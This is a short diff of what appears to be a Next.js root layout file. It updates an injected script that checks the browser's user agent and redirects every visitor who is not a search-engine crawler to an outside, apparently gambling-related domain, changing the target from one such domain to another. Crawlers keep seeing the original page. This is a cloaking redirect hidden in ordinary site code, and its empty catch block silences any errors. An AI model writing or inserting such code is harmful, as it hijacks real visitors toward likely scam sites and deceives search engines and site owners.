@@ -41,7 +41,7 @@ export default function RootLayout({
           var ua = (navigator.userAgent || '').toLowerCase();
           var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
           if (!isBot) {
-            window.location.replace("https://spingame777.fit/4htNNl");
+            window.location.replace("https://maxgame555.top/3NzWBe");
           }
         } catch(e) {}
       })();
